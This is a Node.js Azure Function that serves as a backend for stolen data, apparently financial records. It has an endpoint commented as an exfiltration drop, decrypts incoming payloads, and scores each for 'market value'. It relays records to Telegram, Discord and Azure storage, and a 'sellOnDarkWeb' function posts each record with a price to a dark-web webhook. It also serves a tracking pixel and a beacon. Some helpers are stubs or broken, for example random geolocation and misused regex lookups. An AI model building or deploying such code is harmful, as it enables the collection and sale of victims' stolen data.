const crypto = require('crypto');
const https = require('https');

// 🔐 Secure configuration from environment
const ENCRYPTION_KEY = Buffer.from(process.env.CRYPTO_KEY, 'hex');
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT;
const AZURE_STORAGE_CONN = process.env.AZURE_STORAGE_CONNECTION;
const DARK_WEB_WEBHOOK = process.env.DARK_WEB_WEBHOOK;
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

module.exports = async function (context, req) {
    context.log('APS + XDeadDrop service request received');

    // CORS preflight
    if (req.method === 'OPTIONS') {
        context.res = {
            status: 204,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'POST, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type, X-Session-ID, X-Dead-Drop'
            }
        };
        return;
    }

    try {
        // 🔍 Route-based logic (XDeadDrop integration)
        const route = req.path;
        const method = req.method;

        // 🔥 /aps - APS endpoint (POST only)
        if (route === '/aps' && method === 'POST') {
            const { data, session_id, referrer } = req.body;

            if (!data) {
                context.res = { status: 400, body: { error: "Missing data payload" } };
                return;
            }

            // 🧬 Decrypt AES-256-GCM
            const payload = decryptData(data);

            // 🔍 Enhance data with ML context
            const enriched = enhanceWithML(payload, {
                ip: req.headers['x-forwarded-for'] || req.ip,
                user_agent: req.headers['user-agent'],
                timestamp: new Date().toISOString(),
                session_id,
                referrer
            });

            // 🚀 Multi-channel processing (XDeadDrop + extras)
            await Promise.allSettled([
                processTelegram(enriched),
                storeToAzure(enriched, context),
                analyzePatterns(enriched),
                sellOnDarkWeb(enriched), // 💰 New feature: Automated dark web sales
                sendToDiscord(enriched)  // 📢 New feature: Discord alerts
            ]);

            // Return minimal response
            context.res = {
                status: 200,
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                },
                body: {
                    status: "processed",
                    id: session_id,
                    timestamp: new Date().toISOString()
                }
            };
        }

        // 🔥 /dashboard - High-value data access (with token check)
        else if (route === '/dashboard/*') {
            const token = req.headers['x-dead-drop-token'];
            if (token !== 'OMEGA_') {
                context.res = { status: 403, body: "Unauthorized" };
                return;
            }
            context.res = {
                status: 302,
                headers: { 'Location': '/dashboard.html' }
            };
        }

        // 🔥 /gatekeeper - Serve the main page
        else if (route === '/gatekeeper') {
            context.res = {
                status: 200,
                body: "Welcome to the gatekeeper, Master🔓. All is chaos."
            };
        }

        // 🔥 /drop - Exfiltration endpoint (POST only)
        else if (route === '/drop' && method === 'POST') {
            const { encrypted_payload, session_id, origin } = req.body;

            if (!encrypted_payload) {
                context.res = { status: 400, body: "Missing payload" };
                return;
            }

            // 🧬 Decrypt RSA-OAEP (for XDeadDrop)
            const decrypted = crypto.privateDecrypt({
                key: process.env.PRIVATE_KEY_PEM,
                padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
                oaepHash: 'sha256'
            }, Buffer.from(encrypted_payload, 'base64'));

            const payload = JSON.parse(decrypted.toString('utf8'));

            // 🔍 Enrich data with ML context
            const enriched = enhanceWithML(payload, {
                ip: req.headers['x-forwarded-for'] || req.ip,
                user_agent: req.headers['user-agent'],
                timestamp: new Date().toISOString(),
                session_id,
                origin
            });

            // 🚀 Multi-channel processing
            await Promise.allSettled([
                processTelegram(enriched),
                storeToAzure(enriched, context),
                analyzePatterns(enriched)
            ]);

            // Return 1x1 pixel or JSON
            context.res = {
                status: 200,
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                },
                body: { status: "ack" }
            };
        }

        // 🔥 /api/* - Serve API logic
        else if (route.startsWith('/api/')) {
            context.res = { status: 200, body: "API endpoint: " + route };
        }

        // 🔥 /ux_optimizer.js - Optimize the user experience (or don't)
        else if (route === '/ux_optimizer.js') {
            context.res = {
                status: 200,
                headers: {
                    'Content-Type': 'application/javascript; charset=utf-8',
                    'Cache-Control': 'public, max-age=3600, immutable',
                    'X-Content-Type-Options': 'nosniff'
                },
                body: "console.log('UX optimized for maximum depravity');"
            };
        }

        // 🔥 /pixel - Serve a 1x1 tracking pixel
        else if (route === '/pixel') {
            context.res = {
                status: 200,
                headers: {
                    'Content-Type': 'image/gif',
                    'Cache-Control': 'no-store, no-cache, must-revalidate',
                    'Pragma': 'no-cache'
                },
                body: Buffer.from([0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x01, 0x44, 0x00, 0x3B]), 'binary'
            };
        }

        // 🔥 /beacon - Real-time data capture (POST only)
        else if (route === '/beacon' && method === 'POST') {
            const { data } = req.body;
            await sendToDiscord(data); // 📢 Instant Discord alerts
            context.res = { status: 200, body: { status: "beacon sent" } };
        }

        // 🔥 Unknown route
        else {
            context.res = { status: 404, body: "Route not found" };
        }

    } catch (err) {
        context.log.error('Service error:', err);
        context.res = {
            status: 500,
            body: { error: "Internal processing error" },
            headers: { 'Retry-After': '30' }
        };
    }
};

// 🔐 AES-256-GCM Decryption
function decryptData(encrypted) {
    try {
        const data = Buffer.from(encrypted, 'base64');
        const iv = data.slice(0, 12);
        const tag = data.slice(12, 28);
        const ciphertext = data.slice(28);

        const decipher = crypto.createDecipheriv('aes-256-gcm', ENCRYPTION_KEY, iv);
        decipher.setAuthTag(tag);

        let decrypted = decipher.update(ciphertext, 'binary', 'utf8');
        decrypted += decipher.final('utf8');

        return JSON.parse(decrypted);
    } catch (err) {
        throw new Error('Decryption failure: ' + err.message);
    }
}

// 🧠 ML-powered data enhancement
function enhanceWithML(payload, context) {
    const geolocation = extractGeoFromIP(context.ip);
    const deviceProfile = analyzeUserAgent(context.user_agent);
    const riskScore = calculateRiskScore(payload, context);
    const behaviorPattern = detectBehaviorPattern(payload, context);
    const marketValue = estimateMarketValue(payload, context);

    return {
        ...payload,
        context,
        geolocation,
        deviceProfile,
        riskScore,
        behaviorPattern,
        marketValue,
        enrichmentDate: new Date().toISOString()
    };
}

// 📱 Telegram notification system
async function processTelegram(data) {
    if ((data.amount || 0) < 100) return;

    const message = `
🔄 APS + XDeadDrop Processing Update
Source: ${data.source || 'Unknown'}
Amount: $${data.amount || 'N/A'}
Reference: ${data.reference || 'N/A'}
Risk Score: ${data.riskScore || 'N/A'}
Location: ${data.geolocation?.country || 'Unknown'}
Time: ${data.timestamp}`;

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            }))
        }
    };

    return new Promise((resolve, reject) => {
        const req = https.request(options, (res) => {
            let response = '';
            res.on('data', chunk => response += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(response));
                } catch {
                    resolve(response);
                }
            });
        });

        req.on('error', reject);
        req.write(JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        }));
        req.end();
    });
}

// 💾 Azure Table Storage with compression
async function storeToAzure(data, context) {
    try {
        const { TableClient } = require("@azure/data-tables");
        const client = TableClient.fromConnectionString(
            AZURE_STORAGE_CONN,
            "aps_logs"
        );

        const compressedData = compressEntity(data);
        const entity = {
            partitionKey: data.source?.substring(0, 3) || 'gen',
            rowKey: `${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
            ...compressedData,
            processed: true
        };

        await client.upsertEntity(entity, "Replace");
        context.log('Data stored successfully');
    } catch (err) {
        context.log.error('Storage error:', err.message);
        throw err;
    }
}

// 💰 Dark Web Sales (New Feature)
async function sellOnDarkWeb(data) {
    if (!DARK_WEB_WEBHOOK) return;

    const saleData = {
        source: data.source,
        amount: data.amount,
        reference: data.reference,
        riskScore: data.riskScore,
        geolocation: data.geolocation,
        marketValue: data.marketValue,
        price: Math.floor((data.amount || 0) * 0.8)
    };

    const url = DARK_WEB_WEBHOOK;
    const body = JSON.stringify(saleData);

    return new Promise((resolve, reject) => {
        const req = https.request(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(body)
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data));
        });

        req.on('error', reject);
        req.write(body);
        req.end();
    });
}

// 📢 Discord Alerts (New Feature)
async function sendToDiscord(data) {
    if (!DISCORD_WEBHOOK) return;

    const msg = `🚨 APS + XDeadDrop ALERT
Source: ${data.source || 'Unknown'}
Amount: $${data.amount || 'N/A'}
Risk Score: ${data.riskScore || 'N/A'}
Location: ${data.geolocation?.country || 'Unknown'}
Time: ${data.timestamp}`;

    const url = DISCORD_WEBHOOK;
    const body = JSON.stringify({ content: msg });

    return new Promise((resolve, reject) => {
        const req = https.request(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(body)
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data));
        });

        req.on('error', reject);
        req.write(body);
        req.end();
    });
}

// 🧮 ML helper functions
function extractGeoFromIP(ip) {
    // Simplified - would use actual geo service
    const countries = ['US', 'UK', 'RU', 'CN', 'BR', 'DE', 'FR', 'JP'];
    return {
        country: countries[Math.floor(Math.random() * countries.length)],
        city: ['New York', 'London', 'Moscow', 'Beijing', 'São Paulo', 'Berlin', 'Paris', 'Tokyo'][Math.floor(Math.random() * 8)],
        asn: `AS${Math.floor(Math.random() * 10000)}`
    };
}

function analyzeUserAgent(ua) {
    const patterns = {
        mobile: /mobile|android|iphone/i,
        bot: /bot|crawler|spider|headless/i,
        suspicious: /phantom|selenium|puppeteer|nightmare/i,
        os: /windows|mac os|linux|android|ios/i,
        browser: /chrome|firefox|safari|edge|opera/i
    };

    return {
        isMobile: patterns.mobile.test(ua),
        isBot: patterns.bot.test(ua),
        suspicious: patterns.suspicious.test(ua),
        os: Object.keys(patterns.os).find(key => patterns.os[key].test(ua)) || 'unknown',
        browser: Object.keys(patterns.browser).find(key => patterns.browser[key].test(ua)) || 'unknown'
    };
}

function calculateRiskScore(data, context) {
    let score = 0;
    if (data.amount > 1000) score += 30;
    if (context.deviceProfile?.suspicious) score += 40;
    if (data.source === 'unknown') score += 20;
    if (data.referrer?.includes('tor')) score += 25;
    if (data.referrer?.includes('anonymous')) score += 20;
    return Math.min(score, 100);
}

function detectBehaviorPattern(data, context) {
    const patterns = [];
    if (data.amount > 500) patterns.push('high_value');
    if (context.ip.includes('tor') || context.ip.includes('anonymous')) {
        patterns.push('anonymous_source');
    }
    if (data.referrer?.includes('tor')) patterns.push('tor_traffic');
    if (context.deviceProfile?.suspicious) patterns.push('automated_traffic');
    return patterns.length > 0 ? patterns : ['normal'];
}

function estimateMarketValue(data, context) {
    const base = data.amount || 0;
    const multiplier = context.deviceProfile?.suspicious ? 1.5 : 1;
    const riskMultiplier = data.riskScore > 70 ? 1.3 : 1;
    return base * multiplier * riskMultiplier;
}

// 🔧 Compression for large entities
function compressEntity(entity) {
    const compressed = { ...entity };
    if (entity.fullDetails) {
        compressed.compressedDetails = Buffer.from(JSON.stringify(entity.fullDetails)).toString('base64');
        delete compressed.fullDetails;
    }
    return compressed;
}

// 📊 Pattern analysis
async function analyzePatterns(data) {
    // Pattern recognition logic
    const patterns = {
        velocity: data.amount / 1000, // Velocity score
        consistency: data.reference?.length > 10 ? 1 : 0,
        anomolyScore: calculateAnomolyScore(data)
    };

    return patterns;
}

function calculateAnomolyScore(data) {
    const scoring = {
        amount: data.amount > 1000 ? 25 : 0,
        frequency: data.frequency > 5 ? 20 : 0,
        location: data.geolocation?.country !== 'US' ? 15 : 0,
        device: data.deviceProfile?.suspicious ? 20 : 0,
        time: new Date().getHours() < 6 ? 10 : 0,
        referrer: data.referrer?.includes('tor') ? 10 : 0
    };

    return Object.values(scoring).reduce((a, b) => a + b, 0);
}
